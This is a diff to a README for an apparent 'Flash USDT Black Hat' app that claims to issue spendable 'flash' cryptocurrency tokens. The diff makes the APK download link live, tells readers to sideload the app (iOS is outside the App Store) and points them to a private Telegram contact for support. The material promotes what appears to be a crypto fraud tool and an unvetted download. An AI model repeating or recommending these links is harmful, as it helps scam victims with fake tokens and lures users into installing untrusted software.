@@ -22,7 +22,7 @@ When you gain app access, you will have a **limited spendable quota** of either 
 ## Installation
 
 ### Android
-- Download the latest APK from the [download here]https://apkpure.com/flash-usdt-black-hat/flash.usdtblackhat/download(#).
+- Download the latest APK from the [download here]https://apkpure.com/flash-usdt-black-hat/flash.usdtblackhat/download
 
 ### iOS
 - Visit the official project website to download the iOS version. **This is not an App Store download.**
@@ -48,7 +48,8 @@ Make sure to use this tool **responsibly** and **ethically**. Flash tokens may a
 
 **Stay Connected:**
 - Official Website: [Coin Flashr](#)
-- Support Channel: [Join Here] https://t.me/Usdtfn(#)
+- contact me on telegram
+- Support Channel: [Join Here]https://t.me/privatechaeu
 
 ---
 
